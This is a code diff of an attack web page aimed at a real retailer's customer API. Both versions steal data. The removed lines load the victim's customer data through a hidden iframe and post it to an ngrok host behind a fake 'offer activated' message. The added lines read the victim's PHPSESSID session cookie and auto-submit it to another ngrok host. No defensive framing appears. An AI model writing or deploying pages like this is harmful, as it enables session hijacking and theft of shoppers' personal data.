@@ -1,33 +1,23 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="evilForm" method="GET" action="https://www.boozt.com/at/de-at/api/customer" target="hiddenIframe">
-        <input type="hidden" name="X-Requested-With" value="XMLHttpRequest">
+    <form id="evilForm" method="POST" action="https://1333-2804-4580-1080-7db-6197-e5c8-57e1-8c08.ngrok-free.app/">
+        <input type="hidden" name="trigger" value="https://www.boozt.com/at/de-at/api/customer">
+        <input type="hidden" name="phpsessid">
     </form>
-    <iframe name="hiddenIframe" style="display:none;"></iframe>
     <script>
-        // Envia o formulário automaticamente
+        // Extrair o PHPSESSID dos cookies
+        const phpsessid = document.cookie.split('; ')
+            .find(row => row.startsWith('PHPSESSID='))
+            ?.split('=')[1];
+        
+        if (phpsessid) {
+            document.querySelector("input[name=phpsessid]").value = phpsessid;
+        } else {
+            document.querySelector("input[name=phpsessid]").value = "not_found";
+        }
+        
         document.getElementById("evilForm").submit();
-
-        const iframe = document.getElementsByName("hiddenIframe")[0];
-        iframe.onload = function() {
-            try {
-                // Captura o JSON do iframe
-                const data = iframe.contentWindow.document.body.innerText;
-                if (data && data !== "[]") {
-                    // Envia os dados para o ngrok
-                    const xhr = new XMLHttpRequest();
-                    xhr.open("POST", "https://6574-2804-4580-1080-7db-f323-d027-7f53-d143.ngrok-free.app/", true);
-                    xhr.setRequestHeader("Content-Type", "application/json");
-                    xhr.send(data);
-                    document.body.innerHTML = "Oferta ativada! Dados enviados com sucesso.";
-                } else {
-                    document.body.innerHTML = "Erro: Nenhum dado recebido ou resposta vazia.";
-                }
-            } catch (e) {
-                document.body.innerHTML = "Erro: " + e.message;
-            }
-        };
     </script>
 </body>
 </html>
